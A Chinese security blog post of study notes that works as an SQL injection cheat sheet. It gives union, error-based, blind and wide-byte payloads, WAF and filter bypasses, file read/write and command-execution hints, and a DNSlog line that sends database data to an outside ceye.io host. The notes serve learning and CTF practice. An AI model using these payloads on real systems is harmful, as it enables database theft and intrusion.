<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SQL注入备忘录"><meta name="keywords" content="SQL注入,备忘录,学习笔记"><meta name="author" content="Yunen"><meta name="copyright" content="Yunen"><title>SQL注入备忘录 | Yunen's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?33ecfad176b3600bd31dce47459394e6";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#备忘录-一"><span class="toc-number">1.</span> <span class="toc-text">备忘录(一)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用连接词"><span class="toc-number">1.1.</span> <span class="toc-text">常用连接词</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-数据库："><span class="toc-number">1.2.</span> <span class="toc-text">Access 数据库：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-手工："><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 手工：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-工具："><span class="toc-number">1.2.2.</span> <span class="toc-text">0x02 工具：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql数据库："><span class="toc-number">1.3.</span> <span class="toc-text">mysql数据库：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Version-lt-5-0"><span class="toc-number">1.3.1.</span> <span class="toc-text">Version&lt;5.0:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#version-gt-5-0"><span class="toc-number">1.3.2.</span> <span class="toc-text">version&gt;=5.0:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释："><span class="toc-number">1.3.3.</span> <span class="toc-text">注释：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入："><span class="toc-number">1.4.</span> <span class="toc-text">宽字节注入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入："><span class="toc-number">1.5.</span> <span class="toc-text">报错注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor-和rand"><span class="toc-number">1.5.1.</span> <span class="toc-text">floor()和rand()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.5.2.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml-同上具有32位长度限制"><span class="toc-number">1.5.3.</span> <span class="toc-text">updatexml() 同上具有32位长度限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GeometryCollection-等三重子查询报错"><span class="toc-number">1.5.4.</span> <span class="toc-text">GeometryCollection()等三重子查询报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-Mysql5-5-5"><span class="toc-number">1.5.5.</span> <span class="toc-text">exp() Mysql5.5.5+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#以上类型均为子查询注入"><span class="toc-number">1.5.6.</span> <span class="toc-text">以上类型均为子查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql盲注："><span class="toc-number">1.6.</span> <span class="toc-text">Mysql盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#类型"><span class="toc-number">1.6.1.</span> <span class="toc-text">类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BENCHMARK-count-expr"><span class="toc-number">1.6.2.</span> <span class="toc-text">BENCHMARK(count,expr)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog注入"><span class="toc-number">1.7.</span> <span class="toc-text">DNSlog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入防御："><span class="toc-number">1.8.</span> <span class="toc-text">SQL注入防御：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入绕过："><span class="toc-number">1.9.</span> <span class="toc-text">SQL注入绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#单引号过滤"><span class="toc-number">1.9.1.</span> <span class="toc-text">单引号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#逗号过滤"><span class="toc-number">1.9.2.</span> <span class="toc-text">逗号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#等号过滤"><span class="toc-number">1.9.3.</span> <span class="toc-text">等号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断注入点时的绕过："><span class="toc-number">1.9.4.</span> <span class="toc-text">判断注入点时的绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过WAF"><span class="toc-number">1.9.5.</span> <span class="toc-text">绕过WAF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#与系统直接交互："><span class="toc-number">1.10.</span> <span class="toc-text">与系统直接交互：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他："><span class="toc-number">1.11.</span> <span class="toc-text">其他：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Boolean注入"><span class="toc-number">1.11.1.</span> <span class="toc-text">Boolean注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie注入"><span class="toc-number">1.11.2.</span> <span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF头注入"><span class="toc-number">1.11.3.</span> <span class="toc-text">XFF头注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆叠注入"><span class="toc-number">1.11.4.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#连接符差异："><span class="toc-number">1.11.5.</span> <span class="toc-text">连接符差异：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关好文："><span class="toc-number">1.12.</span> <span class="toc-text">相关好文：</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://q4.qlogo.cn/headimg_dl?dst_uin=2865859175&amp;spec=100"></div><div class="author-info__name text-center">Yunen</div><div class="author-info__description text-center">Just A Websafe Lover!</div><div class="follow-button"><a href="https://github.com/hackeryunen">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">18</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">22</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://www.cnblogs.com/yunen">Yunen's cnblog</a><a class="author-info-links__name text-center" href="http://www.safe6.cn/">Safe6's blog</a><a class="author-info-links__name text-center" href="http://www.lolpzili.com/">Lolpzili's blog</a><a class="author-info-links__name text-center" href="http://www.endereyewxy.com/">Endereye's blog</a><a class="author-info-links__name text-center" href="http://hackerdelort.com/">Delort's blog</a><a class="author-info-links__name text-center" href="https://www.aisnnu.com/">Aisnnu's blog</a><a class="author-info-links__name text-center" href="https://xhyeax.github.io/">Xhy's blog</a><a class="author-info-links__name text-center" href="http://12end.xyz/">12end's blog</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://0d077ef9e74d8.cdn.sohucs.com/rnCyUFE_jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Yunen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/books">Books</a><a class="site-page" href="/about">About</a><a class="site-page" href="/project">Projects</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/atom.xml">RSS</a></span></div><div id="post-info"><div id="post-title">SQL注入备忘录</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-05</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/原创栏目/">原创栏目</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="备忘录-一"><a href="#备忘录-一" class="headerlink" title="备忘录(一)"></a>备忘录(一)</h1><p>拿起小本本记下常考知识点。<br><a id="more"></a></p>
<h2 id="常用连接词"><a href="#常用连接词" class="headerlink" title="常用连接词"></a>常用连接词</h2><ul>
<li>and &amp;&amp; %23%23 且</li>
<li>or || %7c%7c 或</li>
<li>xor 非</li>
</ul>
<h2 id="Access-数据库："><a href="#Access-数据库：" class="headerlink" title="Access 数据库："></a>Access 数据库：</h2><p><strong>只能爆破表名、列名获取数据、无法用盲注等<br>数据主要存储在mdb、sap文件内</strong></p>
<h3 id="0x01-手工："><a href="#0x01-手工：" class="headerlink" title="0x01 手工："></a>0x01 手工：</h3><p>先判断字段数：<br><code>order by xx</code><br>在使用联合查询猜测表名列名：  </p>
<blockquote>
<p>前后两个子查询返回的结构必须相同，且数据类型必须相同，故常用NULL</p>
</blockquote>
<p>猜表：<code>union select 1,2,3,xx</code><br>猜列：<code>union select 1,2,password,4,5</code> (如果页面返回正常，则存在password列，猜表同理)<br>此方法<strong>兼容性</strong>不强。</p>
<h3 id="0x02-工具："><a href="#0x02-工具：" class="headerlink" title="0x02 工具："></a>0x02 工具：</h3><p>逐字猜解法：<br>一、<strong>查表：</strong><br><code>and exists (select * from 表名)</code>//这里的表名需要靠猜解，如果表名存在返回正常页面。<br>二、<strong>查列：</strong><br>将<code>*</code>换成列名可进行爆破列名，即：<code>and exists (select 列名 from 表名)</code><br>三、<strong>确定列名下的数据长度：</strong><br><code>and (select top 1 len(列名) from 表名)=5</code> //判断数据长度是否为5，若为5则返回正常<br>四、<strong>逐字猜解数据：</strong><br><code>and (select top 1 asc(mid(列名,位数,1)) from 表名)=97</code> //用mid函数取第x位字母，通过asc函数转化成ascii码进行判断比较，如果ascii为97，即字母a，页面返回正常</p>
<h2 id="mysql数据库："><a href="#mysql数据库：" class="headerlink" title="mysql数据库："></a>mysql数据库：</h2><h3 id="Version-lt-5-0"><a href="#Version-lt-5-0" class="headerlink" title="Version&lt;5.0:"></a>Version&lt;5.0:</h3><ul>
<li>爆破</li>
<li>盲注</li>
</ul>
<h3 id="version-gt-5-0"><a href="#version-gt-5-0" class="headerlink" title="version&gt;=5.0:"></a>version&gt;=5.0:</h3><p><strong>information_schema</strong>表下存储了Mysql数据库所有的数据库结果信息。  </p>
<ul>
<li>information_schema.schemeta //Mysql里所有的数据库库名</li>
<li>information_schema.tables //所有表名</li>
<li>information_schema.columns //所有列名</li>
</ul>
<p><strong>常用函数：</strong></p>
<ul>
<li>user() //查询数据库用户</li>
<li>version()  //查询版本</li>
<li>@@basedir()  //查询数据库路径</li>
<li>database() //查询当前数据库名</li>
<li>@@version_compile_os() //查询操作系统</li>
</ul>
<p><strong>用法例子：</strong><br><code>union select user(),2,3,version(),database(),xxx</code><br><em>可用null代替：</em><br><code>union select user(),null,null,version(),database(),xxx</code>  </p>
<p><strong>更多函数：</strong></p>
<ul>
<li>concat() //字符串相加</li>
<li>group_concat() //分组打印</li>
<li>length() //取字符串长度</li>
<li>substr(str,pos,len) //str字符串从pos位置开始取len个长度 substring()别名</li>
<li>mid(str,pos,len)  //str字符串从pos位置开始取len个长度</li>
<li>ascii(str)  //返回字符串str的首个字符的ASCII代码值</li>
<li>ord(str) //str或bool转为ascii</li>
<li>if(a,b,c) //a为条件，若a正确则返回b，相反返回c.</li>
</ul>
<p><strong>常用查询：</strong><br>查询全部数据库名：<br><code>select schema_name from information_schema.schemeta limit 0,10</code> //取前十个<br>查询指定表名：<br><code>select table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code> //若单引号被过滤可用十六进制<br>查询指定列名：<br><code>select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;sqli&#39;</code><br>获取指定数据:<br><code>select username,password from sqli.user</code> (垮库查询)  </p>
<h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><blockquote>
<p>#，<br>– X(X为任意字符)<br>/<em>(MySQL-5.1)<br>;%00<br><code>&#39;or 1=1;%00  
&#39;or 1=1 union select 1,2</code>‘<br>‘or 1=1 #<br>‘/</em>!50000or<em>/ 1=1 – -      //版本号为5.1.38时只要小于50138<br>‘/</em>!or*/ 1=1 – -  </p>
</blockquote>
<p><strong>nd/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</strong></p>
<h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>一、常见：<br><strong>mysql数据库编码为gbk,且若’被转义成\’<br>使用<code>id=%df%27</code>，这里的<code>%27</code>会被变成<code>\%27</code>即<code>%5c%27</code>，再加上前边的<code>%df</code>变成<code>%df%5c%27</code>，而<code>%df%5c</code>在gbk字符集中表示汉子： 運，故语句便成<code>id=運&#39;</code>，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)</strong><br>二、php函数utf8转gbk产生：<br><a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">https://xz.aliyun.com/t/1719</a></p>
<h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><h3 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h3><p><strong>虚拟表报错原理：</strong><br>payload:<br><code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code><br><a href="https://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">https://www.2cto.com/article/201604/498394.html</a></p>
<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p><strong>原理：</strong><br>extractvalue函数的第二个参数格式错误，会返回参数内容<br>payload:<br><code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p>
<h3 id="updatexml-同上具有32位长度限制"><a href="#updatexml-同上具有32位长度限制" class="headerlink" title="updatexml() 同上具有32位长度限制"></a>updatexml() 同上具有32位长度限制</h3><p>原理同上<br>payload:<br><code>and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code><br>// concat 在前后加上 ~ 使数据不符合参数格式从而报错</p>
<h3 id="GeometryCollection-等三重子查询报错"><a href="#GeometryCollection-等三重子查询报错" class="headerlink" title="GeometryCollection()等三重子查询报错"></a>GeometryCollection()等三重子查询报错</h3><blockquote>
<p>id = 1 AND GeometryCollection((select <em> from (select </em> from(select user())a)b))<br>polygon()<br>id =1 AND polygon((select <em> from(select </em> from(select user())a)b))<br>multipoint()<br>id = 1 AND multipoint((select <em> from(select </em> from(select user())a)b))<br>multilinestring()<br>id = 1 AND multilinestring((select <em> from(select </em> from(select user())a)b))<br>linestring()<br>id = 1 AND LINESTRING((select <em> from(select </em> from(select user())a)b))<br>multipolygon()<br>id =1 AND multipolygon((select <em> from(select </em> from(select user())a)b))</p>
</blockquote>
<h3 id="exp-Mysql5-5-5"><a href="#exp-Mysql5-5-5" class="headerlink" title="exp() Mysql5.5.5+"></a>exp() Mysql5.5.5+</h3><p><strong>原理：</strong><br>exp函数参数过大，转换时溢出报错<br>payload:<br><code>and exp(~(select * from(select user())a))</code><br><a href="https://drops.secquan.org/tips/8166" target="_blank" rel="noopener">https://drops.secquan.org/tips/8166</a></p>
<h3 id="以上类型均为子查询注入"><a href="#以上类型均为子查询注入" class="headerlink" title="以上类型均为子查询注入"></a>以上类型均为子查询注入</h3><h2 id="Mysql盲注："><a href="#Mysql盲注：" class="headerlink" title="Mysql盲注："></a>Mysql盲注：</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul>
<li>布尔盲注</li>
<li>时间盲注</li>
</ul>
<p>布尔盲注：<br><code>and ascii(substr(select user(),1,1))&gt;64</code> 如果user()第一位字母Ascii大于64则页面返回正常<br>时间盲注：<br><code>and if(ascii(substr(select user(),1,1))&gt;64,sleep(2),1)</code> 如果user()第一位字母Ascii大于64则页面延迟两秒返回  </p>
<h3 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h3><p>此函数会执行expr函数count此，会造成明显时间延迟，可构造进行时间盲注</p>
<p>常见注入：</p>
<ul>
<li>数字型</li>
<li>字符串型<br>按照注入类型：<br>+SELECT型  //常用于获取信息，注入处常位于where 后，后可接注释字符保证查询的语法正确。<br>+INSERT型  //建立新的数据<br>+UPDATA型  //修改数据<br>+DELECT型  //删除数据</li>
</ul>
<p>MYSQL长度限制绕过<br>MYSQL对于用户输入的超长字符只会warning 而不是error<br>真实案例： WP注册admin(55个空格)x用户 修改管理员密码</p>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p><code>select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\&#39;);</code><br><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a><br><a href="https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</a>  </p>
<h2 id="SQL注入防御："><a href="#SQL注入防御：" class="headerlink" title="SQL注入防御："></a>SQL注入防御：</h2><p>1.预编译sql<br>2.限制输入数据类型<br>3.过滤编码<br>4.白名单<br>5.管理数据库用户权限<br>6.按时维护，打好补丁</p>
<h2 id="SQL注入绕过："><a href="#SQL注入绕过：" class="headerlink" title="SQL注入绕过："></a>SQL注入绕过：</h2><p><strong>注入中常注意的编码：</strong></p>
<ul>
<li>%01-%0D特殊字符绕空格</li>
<li>&amp;= 在浏览器Url时要进行URL编码 %26 %3d</li>
<li>查询字符串中不允许有空格，可用%20,+对其编码</li>
<li>Cookie注入时，SQL语句中的分号得编码</li>
</ul>
<h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><p>若有单引号保护，且无编码二次注入即无漏洞。<br>若无单引号保护：<br>字符串可用十六进制表示：<code>0x123456</code>，也可用concat(char(65)+char(75)+xxx)</p>
<p>注：中间层会将这些编码转换成未编码值  </p>
<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p>if()可改写为 case when () then () else () end<br>substr()、mid()等可改写成substr((select user())from(1)for(1))  </p>
<h3 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h3><p>可用regexp、like、rlike、in等代替  </p>
<h3 id="判断注入点时的绕过："><a href="#判断注入点时的绕过：" class="headerlink" title="判断注入点时的绕过："></a>判断注入点时的绕过：</h3><ul>
<li>&amp;&amp; 1=1</li>
<li>&amp;&amp; 1=true</li>
<li>&amp;&amp; false</li>
<li>%23%23 true</li>
<li>%23%23 ‘0’=0</li>
<li>%23%23 ‘a’=’b’=’c’ //true</li>
<li>and~!!~if(‘a’=’b’=”c”,sleep(2),1)</li>
<li>a’&lt;2 返回正常 &lt;0 返回空值</li>
</ul>
<p>特定字符串被过滤时可用考虑全角字符</p>
<h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><blockquote>
<p>a) 大小写混合<br>b)替换关键字<br>c)使用编码<br>d)使用注释<br>e)等价函数与命令<br>f)使用特殊符号<br>g)HTTP参数控制<br>h)缓冲区溢出<br>i)整合绕过  </p>
</blockquote>
<h2 id="与系统直接交互："><a href="#与系统直接交互：" class="headerlink" title="与系统直接交互："></a>与系统直接交互：</h2><blockquote>
<p>load_file()读取文件<br>into out_file() 写文件<br>条件：FILE权限，管理员权限默认具有<br>INTO OUTFILE 与 INTO DOMPFILE的区别<br>后者适用于二进制文件，会将目标文件写入同一行内；前者适用于文本文件。<br>MYSQL UDF命令执行：<code>sqlmap: --os-cmd id -v 1</code><br>MSSQL：xp_cmdshell</p>
</blockquote>
<h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><p>如果页面只返回Yes或No，则原sql查询返回的值可能是可bool值，如果过滤不严，可产生boolean注入，如：<br><code>and length(database())&gt;10</code> 如果次条件为真切前条件返回真，则页面返回正常。  </p>
<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>注入存在于Cookie中</p>
<h3 id="XFF头注入"><a href="#XFF头注入" class="headerlink" title="XFF头注入"></a>XFF头注入</h3><p>注入存在于Header有中的X-Forward-For中，此函数常用于获取客户端真实IP。</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>PHP+Mysql不支持<br><img src="https://wooyun.js.org/images_result/images/2015081902360042624.jpg" alt></p>
<h3 id="连接符差异："><a href="#连接符差异：" class="headerlink" title="连接符差异："></a>连接符差异：</h3><p>Oracle: || 是连接符<br>MSSQL: +<br>MYSQL: [空格]  </p>
<h2 id="相关好文："><a href="#相关好文：" class="headerlink" title="相关好文："></a>相关好文：</h2><p><a href="https://p0sec.net/index.php/archives/117/" target="_blank" rel="noopener">SQL注入备忘手册(更新2017-12-11)</a><br><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">巧用DNSlog实现无回显注入</a><br><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">MySQL注入技巧</a><br><a href="https://wooyun.js.org/drops/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%28count%28%29%E3%80%81rand%28%29%E3%80%81group%20by%29.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group%20by)</a><br><a href="https://wooyun.js.org/drops/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E5%92%8C%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6.html" target="_blank" rel="noopener">深入了解SQL注入绕过waf和过滤机制</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Yunen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.0x002.com/2019/SQL注入备忘录/">https://www.0x002.com/2019/SQL注入备忘录/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.0x002.com">Yunen's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL注入/">SQL注入</a><a class="post-meta__tags" href="/tags/备忘录/">备忘录</a><a class="post-meta__tags" href="/tags/学习笔记/">学习笔记</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/百道CTF刷题记录(一)/"><i class="fa fa-chevron-left">  </i><span>百道CTF刷题记录(一)</span></a></div><div class="next-post pull-right"><a href="/2019/SQL注入使用Django中继数据包bypassWAF/"><span>SQL注入使用Django中继数据包bypassWAF</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'Xl1tFeGDPcFzY1gIYVQo75rr-gzGzoHsz',
  appKey:'6YTKXORDpitI5WYSHaNjY1Ho',
  placeholder:'来都来了，不留下点什么吗？',
  avatar:'hide',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://0d077ef9e74d8.cdn.sohucs.com/rnCyUFE_jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By Yunen</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">攻防无绝对，技术无黑白。<script>(function(){var bp = document.createElement('script');var curProtocol = window.location.protocol.split(':')[0];if (curProtocol === 'https') {bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';}else {bp.src = 'http://push.zhanzhang.baidu.com/push.js';}var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(bp, s);})();</script></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>